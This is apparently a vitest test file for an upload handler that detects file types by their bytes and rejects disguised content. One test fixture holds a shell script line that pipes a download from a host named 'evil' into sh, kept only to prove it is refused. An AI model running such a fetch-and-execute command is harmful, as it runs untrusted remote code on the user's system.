import { describe, expect, it, vi } from 'vitest';
import type { ParkedFilePort } from '../../../../links/application/parked-file.port';
import { UploadSessionAttachmentCommand } from '../upload-session-attachment.command';
import { UploadSessionAttachmentCommandHandler } from '../upload-session-attachment.command-handler';

const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00]);

function harness() {
  const store = {
    park: vi.fn(),
    stage: vi.fn().mockResolvedValue('staged-1'),
    claim: vi.fn(),
    collect: vi.fn(),
  } satisfies ParkedFilePort;
  return { store, handler: new UploadSessionAttachmentCommandHandler(store) };
}

const upload = (
  data: Buffer | undefined,
  organizationId: string | null = 'org-acme',
  hint: { mediaType?: string; fileName?: string } = {},
) => new UploadSessionAttachmentCommand({ organizationId, userId: 'user-1', data, hint });

describe('UploadSessionAttachmentCommandHandler', () => {
  it('keeps an image for its uploader and says what it is by its bytes', async () => {
    const { store, handler } = harness();

    const result = await handler.execute(upload(PNG));

    expect(result).toEqual({ id: 'staged-1', mediaType: 'image/png', size: PNG.length });
    expect(store.stage).toHaveBeenCalledWith({
      organizationId: 'org-acme',
      userId: 'user-1',
      mediaType: 'image/png',
      data: PNG,
    });
  });

  it('takes a PDF and text, the text saved as the type its name picks', async () => {
    const { store, handler } = harness();

    const pdf = Buffer.from('%PDF-1.7\n');
    expect(
      await handler.execute(upload(pdf, 'org-acme', { mediaType: 'application/pdf' })),
    ).toMatchObject({
      mediaType: 'application/pdf',
    });
    const notes = Buffer.from('# Notes\n');
    expect(
      await handler.execute(upload(notes, 'org-acme', { mediaType: '', fileName: 'notes.md' })),
    ).toMatchObject({ mediaType: 'text/markdown' });
    expect(store.stage).toHaveBeenCalledTimes(2);
  });

  it.each([
    ['SVG', Buffer.from('<svg/>')],
    ['an ELF executable', Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00])],
    ['a zip archive', Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00])],
    ['a shell script', Buffer.from('#!/bin/sh\ncurl evil | sh\n')],
    ['HTML', Buffer.from('<!doctype html><script>')],
  ])('refuses %s labelled and named as text, and keeps nothing', async (_, data) => {
    const { store, handler } = harness();

    await expect(
      handler.execute(upload(data, 'org-acme', { mediaType: 'text/plain', fileName: 'notes.txt' })),
    ).rejects.toMatchObject({ code: 'SESSIONS_013' });
    expect(store.stage).not.toHaveBeenCalled();
  });

  it('refuses a caller with no active workspace', async () => {
    const { handler } = harness();

    await expect(handler.execute(upload(PNG, null))).rejects.toMatchObject({
      code: 'SESSIONS_002',
    });
  });

  it('refuses an upload past the per-person cap', async () => {
    const { store, handler } = harness();
    store.stage.mockResolvedValue(undefined);

    await expect(handler.execute(upload(PNG))).rejects.toMatchObject({ code: 'SESSIONS_020' });
  });

  it('answers a request with no file part as no file attached', async () => {
    const { handler } = harness();

    await expect(handler.execute(upload(undefined))).rejects.toMatchObject({
      code: 'SESSIONS_015',
    });
  });
});
